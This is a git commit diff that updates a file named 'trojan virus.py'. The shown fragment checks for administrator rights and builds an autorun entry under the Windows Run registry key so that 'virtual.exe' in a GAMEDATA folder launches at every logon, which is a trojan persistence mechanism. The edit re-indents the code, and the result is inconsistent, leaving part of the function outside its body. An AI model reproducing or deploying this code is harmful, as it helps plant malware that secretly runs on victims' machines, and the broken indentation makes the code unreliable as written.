0f9bef24618f50f8f5b09040163ad6853243ebe9
BoldyDeadCoder <62553730+BoldyDeadCoder@users.noreply.github.com>
2024-01-30 23:28:24 -0500

    Update trojan virus.py

--- trojan virus.py
+++ trojan virus.py
@@ -9,21 +9,19 @@ def is_admin():
         return ctypes.windll.shell32.IsUserAnAdmin()
     except:
         return False
-if is_admin()       
-def AddToRegistry():
-    # in python __file__ is the instant of
-    # file path where it was executed
-    # so if it was executed from desktop,
-    # then __file__ will be
-    # c:\users\current_user\desktop
-    pth = os.path.dirname(os.path.realpath('C://GAMEDATA//virtual.exe'))
-
-    # name of the python file with extension
+if is_admin():
+    def AddToRegistry():
+        # in python __file__ is the instant of
+        # file path where it was executed
+        # so if it was executed from desktop,
+        # then __file__ will be
+        # c:\users\current_user\desktop
+        pth = os.path.dirname(os.path.realpath('C://GAMEDATA//virtual.exe'))
+        # name of the python file with extension
     s_name = "virtual.exe"
-
     # joins the file name to end of path address
     address = os.path.join(pth, s_name)
-
+    
     # key we want to change is HKEY_CURRENT_USER
     # key value is Software\Microsoft\Windows\CurrentVersion\Run
     key = reg.HKEY_CURRENT_USER
